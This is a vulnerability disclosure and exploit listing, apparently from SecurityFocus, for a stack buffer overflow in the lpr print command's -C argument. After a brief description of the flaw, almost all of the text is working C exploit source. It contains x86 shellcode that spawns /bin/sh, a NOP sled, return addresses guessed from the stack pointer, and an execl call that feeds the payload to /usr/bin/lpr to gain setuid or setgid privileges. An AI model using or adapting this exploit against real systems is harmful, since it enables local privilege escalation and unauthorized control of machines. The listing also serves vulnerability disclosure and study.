source: http://www.securityfocus.com/bid/707/info
 
Due to insufficient bounds checking on arguments (in this case -C) which are supplied by users, it is possible to overwrite the internal stack space of the lpr program while it is executing. This can allow an intruder to cause lpr to execute arbitrary commands by supplying a carefully designed argument to lpr. These commands will be run with the privileges of the lpr program. When lpr is installed setuid or setgid, it may allow intruders to gain those privileges.

 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>

 #define DEFAULT_OFFSET 50
 #define BUFFER_SIZE 1023

 long get_esp(void)
 {
 __asm__("movl %esp,%eax\n");
 }

 void main()
 {
 char *buff = NULL;
 unsigned long *addr_ptr = NULL;
 char *ptr = NULL;

 char execshell[] =
 "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
 "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
 "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
 "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

 int i;

 buff = malloc(4096);
 if(!buff)
 {
 printf("can't allocate memory\n");
 exit(0);
 }
 ptr = buff;
 memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
 ptr += BUFFER_SIZE-strlen(execshell);
 for(i=0;i < strlen(execshell);i++)
 *(ptr++) = execshell[i];
 addr_ptr = (long *)ptr;
 for(i=0;i<2;i++)
 *(addr_ptr++) = get_esp() + DEFAULT_OFFSET;
 ptr = (char *)addr_ptr;
 *ptr = 0;
 execl("/usr/bin/lpr", "lpr", "-C", buff, NULL);
 }